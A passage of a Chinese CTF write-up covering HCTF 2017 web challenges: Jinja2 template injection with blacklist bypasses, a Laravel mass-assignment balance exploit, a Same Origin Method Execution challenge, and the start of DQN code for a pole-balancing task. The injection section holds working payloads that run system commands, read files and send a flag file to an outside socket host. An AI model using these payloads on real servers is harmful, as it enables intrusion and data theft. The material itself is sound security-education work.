打开题目F12发现server为
    Server: Werkzeug/0.12.2 Python/2.7.12
然后发现输入x就返回x was not found.  
差不多可以想到jinja模板注入问题  
测试
    secret={{2-1}}
返回1 was not found.即可验证  
由于也是黑名单过滤，绕过方式看师傅们的姿势  
request.args过滤了
    空格(%20)，回车(%0a)，'__','[',']','os','"',"|[a-z]"
直接构造是可以bypass的  
空格可以用tab(%09)绕过，|后不允许接a-z可以用%0c，tab等绕过，os可以通过python中exec绕过  
但是这题过滤仅限于request.args但是不允许post  
简单的办法是可以用request.cookies来绕过  
只能读文件的方法要找flag首先需要先到/etc/passwd看到有hctf用户,然后读取/home/hctf/.bash_history,发现flag路径/h3h3_1s_your_flag/flag,在读取flag  
随便列几种解题方法  
1.不用blask_list里的符号
    secret={%set%0ca,b,c,d,e,f,g,h,i=request|%0cattr(request.args.class|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))|%0cattr(request.args.mro|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))%}{{(i|%0cattr(request.args.subc|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=%s%sclass%s%s&mro=%s%smro%s%s&subc=%s%ssubclasses%s%s&usc=_&file=/tmp/foo.py&write=w&a=_&payload=import%0csocket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xxx.xxx.xxx.xxx',2333));s.send(open('/h3h3_1s_your_flag/flag').read());
2.exec构造绕过'os'执行os系统命令
    a='import\x0co'+'s;o'+'s.system(\'ls${IFS}/\')';exec(a)
3.通过request.cookies
    Url: http://repeater.2017.hctf.io/?secret={{request|%0cattr(request.cookies.class)|%0cattr(request.cookies.mro)|%0clast()|%0cattr(request.cookies.sub)()|%0cattr(request.cookies.getitem)(40)(request.cookies.file)|%0cattr(request.cookies.read)()}}
    Cookie: file=/h3h3_1s_your_flag/flag;class=__class__;mro=__mro__;sub=__subclasses__;getitem=__getitem__;read=read;
### Who are you?
进入界面，右上登录，Steam 账号授权。
然后进`Home`发现有`infomation`和`shop`。`shop`里可以买flag推测但显示余额不足。
购买动作的URL为`http://gogogo.2017.hctf.io/shop/3`，修改3为4可以发现调试模式没关，源码泄露。
    public function buy(Request $request)
        {
            $itemId = $request->route('id');
            $item = Item::find($itemId);
            $prize = $item->prize;
            $balance = Info::find(Auth::id())->amount;
            if ($balance >= $prize) {
                return view('message', ['message' => $item->note]);
            }
            return view('message', ['message' => 'Sorry Sir! You don\'t have enough money']);
        }
得知后端框架为 `Laravel`，账户余额字段名为`amount`。
infomation页尝试把表单中的name字段改成amount字段并提交，即可充值。
购买拿到`flag：hctf{csgo_is_best_fps_game_dA3jf}`。
推测没有限定提交表单的参数，可以反推后端代码可能为。
    public function update(Request $request)
    {
      $user = Info::where('id', Auth::id())->update($request->all());
    }
Laravel
使用update方法批量赋值时应在Model中声明fillable白名单或者guard黑名单限制参数，或者使用`$request->only()`来限制。
### Deserted place
    Deserted place
    Description 
    maybe nothing here 
    flag in admin cookie
    Now Score 820.35
    Team solved 3
出题思路来自于一个比较特别的叫做SOME的攻击方式，全名`Same Origin Method
Execution`，这是一种2015年被人提出来的攻击方式，可以用来执行同源环境下的任意方法，2年前就有人做了分析。
[原paper](http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf)  
这里我就不讨论具体的SOME攻击，稍后我会在博客等地方更新具体的分析。
回到题目。
打开题目主要功能有限：  
1、登陆  
2、注册  
3、修改个人信息（修改个人信息后按回车更新自己的信息）、  
4、获取随机一个人的信息，并把它的信息更新给我自己
简单测试可以发现，个人信息页面存在self-xss，但问题就在于怎么能更新admin的个人信息。
仔细回顾站内的各种信息，我们能发现所有的更新个人信息都是通过开启子窗口来实现的。
edit.php里面有一个类似于jsonp的接口可以执行任意函数，简单测试可以发现这里正则匹配了`.\w+`，这意味这我们只能执行已有的js函数，我们可以看看后台的代码。
    $callback = $_GET['callback'];  
    preg_match("/\w+/i", $callback, $matches);
    ...
    echo "";
已有的函数一共有3个
    function UpdateProfile(){
        var username = document.getElementById('user').value;
        var email = document.getElementById('email').value;
        var message = document.getElementById('mess').value;
        window.opener.document.getElementById("email").innerHTML="Email: "+email;
        window.opener.document.getElementById("mess").innerHTML="Message: "+message;
        console.log("Update user profile success...");
        window.close();
    }
    function EditProfile(){
        document.onkeydown=function(event){
            if (event.keyCode == 13){
                UpdateProfile();
            }
        }
    }
    function RandomProfile(){
        setTimeout('UpdateProfile()', 1000);
    }
如果执行`UpdateProfile`，站内就会把子窗口的内容发送到父窗口中。但是我们还是没办法控制修改的内容。
回顾站内逻辑，当我们点击click
me，首先请求`/edit.php?callback=RandomProfile`，然后跳转至任意`http://hctf.com/edit.php?callback=RandomProfile&user=xiaoming`，然后页面关闭并，更新信息到当前用户上，假设这里user是我们设定的还有恶意代码的user，那我们就可以修改admin的信息了，但，怎么能让admin打开这个页面呢？
我们可以尝试一个，如果直接打开`edit.php?callback=RandomProfile&user=xiaoming`  
报错了，不是通过open打开的页面，寻找不到页面内的`window.opener`对象，也就没办法做任何事。
这里我们只有通过SOME，才能操作同源下的父窗口，首先我们得熟悉同源策略，同源策略规定，只有同源下的页面才能相互读写，如果通过`windows.open`打开的页面是同源的，那么我们就可以通过`window.opener`对象来操作父子窗口。
而SOME就是基于这种特性，可以执行同源下的任意方法。
最终payload：
vps, 1.html
vps, 2.html
在lorexxar账户的message里添加payload
getflag!
## level5
### A true man can play a palo one hundred time
#### 题目说明
    Question
    Now you have a balance palo.
You can move it left or right.
Just play hundred time on it.
    Description
    Get request receive two params 
        1.  move, 0 or 1
        2.  id, just your token
    Observation
        1.  pole position x
        2.  a value depend on x
        3.  pole deviate from center Î¸
        4.  a value depend on Î¸
    Why you failed
    Î¸ or x > a certain value
总而言之就是个玩棒子的游戏(雾。  
之所以出现在最后一道请去问关卡规则的设计者。  
因为ctf本来不应该出现这种问题，所以我有意把这题设计得简单了一点，但是，ctf真是不讲道理，也导致这道题被少量非预期。
其实就是一个非常非常简单的强化学习的问题，甚至不需要强化学习去解。
#### DQN网络结构定义
    import numpy as np
    import tensorflow as tf
    import requests
    import math
    class DeepQNetwork:
        def __init__(
                self,
                n_actions,
                n_features,
                learning_rate=0.01,
                reward_decay=0.9,
                e_greedy=0.9,
                replace_target_iter=300,
                memory_size=500,
                batch_size=32,
                e_greedy_increment=None,
                output_graph=False,
        ):
            self.n_actions = n_actions
            self.n_features = n_features
            self.lr = learning_rate
            self.gamma = reward_decay
            self.epsilon_max = e_greedy
            self.replace_target_iter = replace_target_iter
            self.memory_size = memory_size
            self.batch_size = batch_size
            self.epsilon_increment = e_greedy_increment
            self.epsilon = 0 if e_greedy_increment is not None else self.epsilon_max
            # total learning step
            self.learn_step_counter = 0
            # initialize zero memory [s, a, r, s_]
            self.memory = np.zeros((self.memory_size, n_features * 2 + 2))
            # consist of [target_net, evaluate_net]
            self._build_net()
            t_params = tf.get_collection('target_net_params')
            e_params = tf.get_collection('eval_net_params')
            self.replace_target_op = [tf.assign(t, e) for t, e in zip(t_params, e_params)]
            self.sess = tf.Session()
            if output_graph:
                # $ tensorboard --logdir=logs
                # tf.train.SummaryWriter soon be deprecated, use following
                tf.summary.FileWriter("logs/", self.sess.graph)
            self.sess.run(tf.global_variables_initializer())
            self.cost_his = []
        def _build_net(self):
            # ------------------ build evaluate_net ------------------            self.s = tf.placeholder(tf.float32, [None, self.n_features], name='s')  # input
            self.q_target = tf.placeholder(tf.float32, [None, self.n_actions], name='Q_target')  # for calculating loss
            with tf.variable_scope('eval_net'):
                # c_names(collections_names) are the collections to store variables
                c_names, n_l1, w_initializer, b_initializer = \
                    ['eval_net_params', tf.GraphKeys.GLOBAL_VARIABLES], 10, \
                    tf.random_normal_initializer(0., 0.3), tf.constant_initializer(0.1)  # config of layers
                # first layer. collections is used later when assign to target net
                with tf.variable_scope('l1'):
                    w1 = tf.get_variable('w1', [self.n_features, n_l1], initializer=w_initializer, collections=c_names)
                    b1 = tf.get_variable('b1', [1, n_l1], initializer=b_initializer, collections=c_names)
                    l1 = tf.nn.relu(tf.matmul(self.s, w1) + b1)
                # second layer. collections is used later when assign to target net
                with tf.variable_scope('l2'):
                    w2 = tf.get_variable('w2', [n_l1, self.n_actions], initializer=w_initializer, collections=c_names)
                    b2 = tf.get_variable('b2', [1, self.n_actions], initializer=b_initializer, collections=c_names)
                    self.q_eval = tf.matmul(l1, w2) + b2
            with tf.variable_scope('loss'):
                self.loss = tf.reduce_mean(tf.squared_difference(self.q_target, self.q_eval))
            with tf.variable_scope('train'):
                self._train_op = tf.train.RMSPropOptimizer(self.lr).minimize(self.loss)
            # ------------------ build target_net ------------------            self.s_ = tf.placeholder(tf.float32, [None, self.n_features], name='s_')    # input
            with tf.variable_scope('target_net'):
                # c_names(collections_names) are the collections to store variables
                c_names = ['target_net_params', tf.GraphKeys.GLOBAL_VARIABLES]
                # first layer. collections is used later when assign to target net
                with tf.variable_scope('l1'):
                    w1 = tf.get_variable('w1', [self.n_features, n_l1], initializer=w_initializer, collections=c_names)
                    b1 = tf.get_variable('b1', [1, n_l1], initializer=b_initializer, collections=c_names)